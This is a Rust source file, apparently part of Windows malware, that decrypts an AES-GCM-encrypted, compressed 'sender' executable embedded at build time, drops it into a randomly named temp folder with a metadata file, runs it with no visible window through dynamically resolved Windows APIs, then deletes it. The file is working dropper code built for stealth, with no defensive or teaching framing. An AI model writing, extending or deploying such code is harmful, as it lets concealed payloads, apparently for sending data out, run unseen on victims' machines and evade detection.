//! Extract embedded sender.exe, spawn it hidden, wait for delivery.

use std::{
    ffi::OsStr,
    fs,
    os::windows::ffi::OsStrExt,
    path::{Path, PathBuf},
    time::{SystemTime, UNIX_EPOCH},
};

use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};
use flate2::read::DeflateDecoder;
use std::io::Read;

use crate::sender::DeliveryMeta;

const OBFUSCATED_SENDER: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/sender_obf.bin"));
const SENDER_KEY: &[u8; 32] = include_bytes!(concat!(env!("OUT_DIR"), "/sender_key.bin"));
const SENDER_NONCE: &[u8; 12] = include_bytes!(concat!(env!("OUT_DIR"), "/sender_nonce.bin"));

const CREATE_NO_WINDOW: u32 = 0x0800_0000;

#[repr(C)]
#[allow(non_snake_case)]
struct STARTUPINFOW {
    cb: u32,
    _reserved1: *mut u16,
    _desktop: *mut u16,
    _title: *mut u16,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    _reserved2: u16,
    _reserved3: *mut u8,
    hStdInput: *mut std::ffi::c_void,
    hStdOutput: *mut std::ffi::c_void,
    hStdError: *mut std::ffi::c_void,
}

#[repr(C)]
#[allow(non_snake_case)]
struct PROCESS_INFORMATION {
    hProcess: *mut std::ffi::c_void,
    hThread: *mut std::ffi::c_void,
    dwProcessId: u32,
    dwThreadId: u32,
}

fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn session_tag() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

pub fn session_dir() -> PathBuf {
    std::env::temp_dir().join(session_tag())
}

#[inline(never)]
fn decrypt_sender(enc: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
    if enc.is_empty() {
        return Vec::new();
    }
    let cipher = unsafe { Aes256Gcm::new_from_slice(key).unwrap_unchecked() };
    let n = Nonce::from_slice(nonce);
    cipher.decrypt(n, enc).unwrap_or_default()
}

#[inline(never)]
fn embedded_sender_bytes() -> Vec<u8> {
    let compressed = decrypt_sender(OBFUSCATED_SENDER, SENDER_KEY, SENDER_NONCE);
    if compressed.is_empty() {
        return Vec::new();
    }
    let mut decoder = DeflateDecoder::new(&compressed[..]);
    let mut out = Vec::new();
    let _ = decoder.read_to_end(&mut out);
    out
}

fn write_meta(session: &Path, meta: &DeliveryMeta) -> Option<PathBuf> {
    let meta_path = session.join(crate::encrypted::s_spawn_meta_name());
    let json = serde_json::to_string(meta).ok()?;
    fs::write(&meta_path, json).ok()?;
    Some(meta_path)
}

fn spawn_hidden(sender_exe: &Path, meta_path: &Path) -> bool {
    let cmd = format!(
        "\"{}\" \"{}\"",
        sender_exe.display(),
        meta_path.display()
    );
    let mut cmd_w = wide(&cmd);

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    unsafe {
        let ok = inject::dynapi::CreateProcessW(
            std::ptr::null(),
            cmd_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si as *mut _ as *mut _,
            &mut pi as *mut _ as *mut _,
        );
        if ok == 0 {
            return false;
        }

        inject::dynapi::WaitForSingleObject(pi.hProcess, 180_000);
        inject::dynapi::CloseHandle(pi.hThread);
        inject::dynapi::CloseHandle(pi.hProcess);
    }
    true
}

/// Launch embedded sender invisibly. Returns true if delivery subprocess ran.
pub fn dispatch(session: &Path, meta: &DeliveryMeta) -> bool {
    let sender_bytes = embedded_sender_bytes();
    if sender_bytes.is_empty() {
        return false;
    }

    let _ = fs::create_dir_all(session);

    let sender_path = session.join(crate::encrypted::s_spawn_sender_name());
    if fs::write(&sender_path, &sender_bytes).is_err() {
        return false;
    }

    let meta_path = match write_meta(session, meta) {
        Some(p) => p,
        None => return false,
    };

    let ok = spawn_hidden(&sender_path, &meta_path);
    let _ = fs::remove_file(&sender_path);
    ok
}

pub fn cleanup_session(session: &Path) {
    let _ = fs::remove_dir_all(session);
}
